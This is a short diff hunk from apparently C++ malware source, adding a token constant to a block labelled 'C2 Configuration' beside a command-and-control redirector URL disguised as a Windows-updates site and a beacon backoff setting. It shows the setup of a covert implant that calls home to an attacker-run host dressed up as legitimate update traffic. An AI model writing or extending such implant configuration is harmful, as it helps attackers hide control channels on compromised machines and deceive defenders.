@@ -7,6 +7,7 @@ namespace core {
 
 // C2 Configuration
 const std::string REDIRECTOR_URL = "https://windows-updates.vercel.app/";
+const std::string API_KEY = "SECRET_C2_TOKEN_2026";
 const double C2_FETCH_BACKOFF = 60.0;
 
 // Beacon Configuration
